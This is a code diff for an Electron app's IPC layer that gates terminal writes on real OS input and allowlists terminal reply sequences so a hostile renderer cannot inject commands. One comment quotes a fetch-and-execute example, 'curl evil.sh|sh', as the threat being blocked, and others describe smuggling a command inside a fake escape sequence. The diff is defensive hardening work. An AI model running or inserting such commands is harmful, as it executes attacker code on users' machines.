@@ -17,7 +17,7 @@ import {
 } from '@sim/terminal-protocol'
 import { isRecordLike } from '@sim/utils/object'
 import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } from 'electron'
-import { ipcMain } from 'electron'
+import { clipboard, ipcMain } from 'electron'
 import {
   clearBrowsingData,
   executeTool,
@@ -52,6 +52,7 @@ import { listSites } from '@/main/browser-sites'
 import { isSafeInternalPath } from '@/main/config'
 import type { DesktopSettingsService } from '@/main/desktop-settings'
 import { isDesktopPreferenceKey } from '@/main/desktop-settings'
+import { hasRecentDeliberateInput, hasRecentDiscreteInput } from '@/main/input-activity'
 import type { LocalFilesystemService } from '@/main/local-filesystem'
 import { isAppOrigin, openExternalSafe } from '@/main/navigation'
 import type { TerminalService } from '@/main/terminal'
@@ -267,6 +268,12 @@ type ChannelSpec =
     })
   | (ChannelSpecBase & {
       kind: 'send'
+      /**
+       * Requires recent real OS input before a payload is forwarded. Payload-
+       * scoped rather than channel-scoped because the same channel also carries
+       * terminal replies the PTY solicits, which arrive with no user input.
+       */
+      payloadNeedsDeliberateInput?: boolean
       handler: (...args: unknown[]) => void
     })
 
@@ -307,14 +314,56 @@ function localFilesystemRequestNeedsToolAuthorization(request: unknown): boolean
   )
 }
 
-async function rendererHasActiveUserGesture(event: IpcMainInvokeEvent): Promise<boolean> {
-  const frame = event.senderFrame
-  if (!frame || typeof frame.executeJavaScript !== 'function') return false
-  try {
-    return (await frame.executeJavaScript('navigator.userActivation?.isActive === true')) === true
-  } catch {
-    return false
-  }
+/**
+ * Whether the caller has a real user gesture behind it, answered from the main
+ * process's own record of OS input rather than by asking the renderer.
+ */
+function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
+  return hasRecentDiscreteInput(event.sender)
+}
+
+/**
+ * Replies the PTY solicits and the terminal must answer unprompted. All
+ * machine-generated and self-delimiting, which is what makes them safe to
+ * enumerate.
+ *
+ * Bodies are printable-only ({@link PTY_REPLY_BODY}), never `[\s\S]`. A real
+ * DCS or OSC reply carries text terminated by ST or BEL and never a control
+ * byte, so an unbounded interior would let a hostile renderer wrap a whole
+ * command and its submit inside a fake `ESC ] ... CR BEL` and be waved through
+ * as a reply, reopening the path this gate exists to close. X10 mouse is
+ * bounded the same way: its three bytes are offset by 32, so a control byte
+ * there is never legitimate either.
+ */
+const PTY_REPLY_BODY = '[\\u0020-\\u00ff]'
+const PTY_REPLY_PATTERNS = [
+  /\u001b\[[0-9;?]*[Rc]/, // DSR cursor position, device attributes
+  /\u001b\[[IO]/, // focus in/out (mode 1004)
+  new RegExp(`\\u001b\\[M${PTY_REPLY_BODY}{3}`), // X10 mouse report
+  /\u001b\[<[0-9;]*[mM]/, // SGR mouse report
+  new RegExp(`\\u001bP${PTY_REPLY_BODY}*?\\u001b\\\\`), // DCS response
+  new RegExp(`\\u001b\\]${PTY_REPLY_BODY}*?(?:\\u0007|\\u001b\\\\)`), // OSC response
+]
+const PTY_REPLY = new RegExp(
+  `^(?:${PTY_REPLY_PATTERNS.map((pattern) => pattern.source).join('|')})+$`
+)
+
+/**
+ * Whether a terminal-write payload needs a person behind it.
+ *
+ * The reply set is enumerated and everything else is gated, rather than the
+ * other way round. "What submits" is not a closed set: besides carriage return
+ * and newline, EOT (`0x04`) hands a partial line straight to a reader in
+ * canonical mode, and `0x0f` is `operate-and-get-next` in bash and
+ * `accept-line-and-down-history` in zsh — both of which execute the current
+ * line. A user's own `inputrc` or `zle` bindings can add more. Enumerating that
+ * set would leave whichever binding was forgotten ungated, so the allowlist runs
+ * the other way and fails closed.
+ */
+function needsDeliberateInputForWrite(args: unknown[]): boolean {
+  const data = args[1]
+  if (typeof data !== 'string' || data.length === 0) return false
+  return !PTY_REPLY.test(data)
 }
 
 interface DesktopToolAuthorization {
@@ -872,6 +921,24 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       handler: (sender, focused) =>
         deps.terminal.setPanelFocused(focused === true, sender as WebContents),
     },
+    'terminal:paste': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      denied: false,
+      // The bytes come from the clipboard here, not from the caller, so this
+      // does not need the write gate: a compromised renderer can only replay
+      // what the user already copied. It still needs a real gesture, because
+      // the legitimate caller is a Paste click or ⌘V.
+      needsUserActivation: true,
+      handler: (terminalId) => {
+        if (typeof terminalId !== 'string') return false
+        const text = clipboard.readText()
+        if (!text) return false
+        deps.terminal.write(terminalId, text)
+        return true
+      },
+    },
     'terminal:scrollback': {
       kind: 'invoke',
       gate: 'app-origin',
@@ -919,10 +986,20 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'terminal',
       handler: (terminalId, data) => {
-        if (typeof terminalId === 'string' && typeof data === 'string') {
-          deps.terminal.write(terminalId, data)
-        }
+        if (typeof terminalId !== 'string' || typeof data !== 'string') return
+        deps.terminal.write(terminalId, data)
       },
+      // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
+      // Panel focus is deliberately not used — `terminal:focused` is a
+      // renderer-asserted claim the same attacker can set.
+      //
+      // MITIGATION, NOT CLOSURE. Text without a newline still reaches the shell's
+      // line buffer, where the user's own next Enter submits it — visible on
+      // screen, but not prevented. Closing that needs the interactive path off
+      // the renderer surface entirely (main writing the keystrokes it already
+      // observes) or the terminal in its own WebContents, neither of which is a
+      // gate change. Tracked as follow-up.
+      payloadNeedsDeliberateInput: true,
     },
     'terminal:resize': {
       kind: 'send',
@@ -972,7 +1049,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     if (spec.kind === 'invoke') {
       ipcMain.handle(channel, async (event, ...args) => {
         if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return spec.denied
-        if (spec.needsUserActivation && !(await rendererHasActiveUserGesture(event))) {
+        if (spec.needsUserActivation && !senderHasUserGesture(event)) {
           return spec.denied
         }
         let handlerArgs = args
@@ -1013,7 +1090,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         if (
           channel === 'desktop:local-filesystem' &&
           localFilesystemRequestNeedsUserActivation(args[0]) &&
-          !(await rendererHasActiveUserGesture(event))
+          !senderHasUserGesture(event)
         ) {
           return {
             ok: false,
@@ -1039,9 +1116,15 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       })
     } else {
       ipcMain.on(channel, (event, ...args) => {
-        if (senderAllowed(event, spec.gate) && featureAllowed(spec.requires)) {
-          spec.handler(...(spec.passSender ? [event.sender, ...args] : args))
+        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
+        if (
+          spec.payloadNeedsDeliberateInput &&
+          needsDeliberateInputForWrite(args) &&
+          !hasRecentDeliberateInput(event.sender)
+        ) {
+          return
         }
+        spec.handler(...(spec.passSender ? [event.sender, ...args] : args))
       })
     }
   }
